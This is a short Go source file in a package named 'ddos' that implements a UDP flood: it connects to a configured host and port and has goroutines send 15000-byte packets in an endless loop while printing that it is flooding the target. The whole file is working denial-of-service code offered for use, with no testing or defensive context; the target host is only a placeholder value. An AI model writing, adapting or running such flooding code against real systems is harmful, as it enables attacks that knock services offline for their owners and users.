package ddos

import (
	"flag"
	"fmt"
	"net"
)

var (
	_host    = "12341234"
	_port    = 443
	_threads = 1
	_size    = 15000
)

//UDPFlood udp flood
func UDPFlood() {
	flag.Parse()

	fullAddr := fmt.Sprintf("%s:%v", _host, _port)
	//Create send buffer
	buf := make([]byte, _size)

	//Establish udp
	conn, err := net.Dial("udp", fullAddr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Flooding %s\n", fullAddr)
		for i := 0; i < _threads; i++ {
			go func() {
				for {
					_, err = conn.Write(buf)
					fmt.Println(err)
				}
			}()
		}
	}

	//Sleep forever
	<-make(chan bool, 1)
}
